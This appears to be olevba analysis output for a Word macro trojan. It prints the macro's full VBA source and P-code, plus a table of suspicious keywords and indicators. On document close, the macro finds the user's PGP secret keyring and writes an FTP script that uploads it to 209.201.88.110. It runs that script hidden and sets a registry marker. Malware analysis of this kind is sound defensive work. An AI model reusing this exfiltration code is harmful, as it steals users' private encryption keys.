olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Pgpt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Pgpt - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
'çàðàæåíèå ïðè çàêðûòèè äîêóìåíòà
'...
'ïðîâåðÿåì êëþ÷ áûë óêðàäåí ñ ýòîé ìàøèíû, ñåëè íåò òî
èùåì êëþ÷
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info", "Caligula") = False) Then pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP EncryptedFile\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")
'óçíàåì ãäå êàòîëîã(?) pgp
If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP 'íà ýòîì êîìïå íåò pgp
End If

With Application.FileSearch
.FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With
'èùåì íóæíûé íàì ôàéë
Randomize
  For i = 1 To 4
 NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"
Open "c:\cdbrk.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1
'îòêðîåì è çàïèøèì ïàðàìåòðû îòñûëêè
Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide
'îòñûëàåì pgp êëþ÷
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info", "Caligula") = True

End If

noPGP:
'íåò pgp
'ñîõðàíÿåì â àêòèâíîì äîêóìåíòå
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Trojan.MSWord.Pgpt
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4220 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub AutoClose())
' Line #2:
' 	QuoteRem 0x0000 0x0020 "çàðàæåíèå ïðè çàêðûòèè äîêóìåíòà"
' Line #3:
' 	QuoteRem 0x0000 0x0003 "..."
' Line #4:
' 	QuoteRem 0x0000 0x0035 "ïðîâåðÿåì êëþ÷ áûë óêðàäåí ñ ýòîé ìàøèíû, ñåëè íåò òî"
' Line #5:
' 	Ld êëþ÷ 
' 	ArgsCall èùåì 0x0001 
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info"
' 	LitStr 0x0008 "Caligula"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	LitStr 0x0036 "HKEY_CLASSES_ROOT\PGP EncryptedFile\shell\open\command"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St pgppath 
' 	EndIf 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld pgppath 
' 	LitStr 0x0004 "pgpt"
' 	FnInStr3 
' 	St Position 
' Line #8:
' 	QuoteRem 0x0000 0x0019 "óçíàåì ãäå êàòîëîã(?) pgp"
' Line #9:
' 	Ld Position 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #10:
' 	Ld pgppath 
' 	LitDI2 0x0001 
' 	Ld Position 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St pgppath 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	GoTo noPGP 
' 	QuoteRem 0x000B 0x0015 "íà ýòîì êîìïå íåò pgp"
' Line #13:
' 	EndIfBlock 
' Line #14:
' Line #15:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #16:
' 	LitStr 0x000C "\Secring.skr"
' 	MemStWith FileName 
' Line #17:
' 	Ld pgppath 
' 	MemStWith LookIn 
' Line #18:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #19:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #20:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #21:
' 	ArgsMemCallWith Execute 0x0000 
' Line #22:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St PGP_Sec_Key 
' Line #23:
' 	EndWith 
' Line #24:
' 	QuoteRem 0x0000 0x0014 "èùåì íóæíûé íàì ôàéë"
' Line #25:
' 	ArgsCall Read 0x0000 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #27:
' 	Ld NewSecRingFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St NewSecRingFile 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	LitStr 0x0009 "./secring"
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0004 ".skr"
' 	Concat 
' 	St NewSecRingFile 
' Line #30:
' 	LitStr 0x000C "c:\cdbrk.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "put ""
' 	Ld PGP_Sec_Key 
' 	Concat 
' 	LitStr 0x0003 "" ""
' 	Concat 
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #39:
' 	QuoteRem 0x0000 0x0023 "îòêðîåì è çàïèøèì ïàðàìåòðû îòñûëêè"
' Line #40:
' 	LitStr 0x0029 "command.com /c ftp.exe -n -s:c:\cdbrk.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #41:
' 	QuoteRem 0x0000 0x0011 "îòñûëàåì pgp êëþ÷"
' Line #42:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info"
' 	LitStr 0x0008 "Caligula"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #43:
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	Label noPGP 
' Line #47:
' 	QuoteRem 0x0000 0x0007 "íåò pgp"
' Line #48:
' 	QuoteRem 0x0000 0x001E "ñîõðàíÿåì â àêòèâíîì äîêóìåíòå"
' Line #49:
' 	EndSub 
' Line #50:
' Line #51:
' Line #52:
' Line #53:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

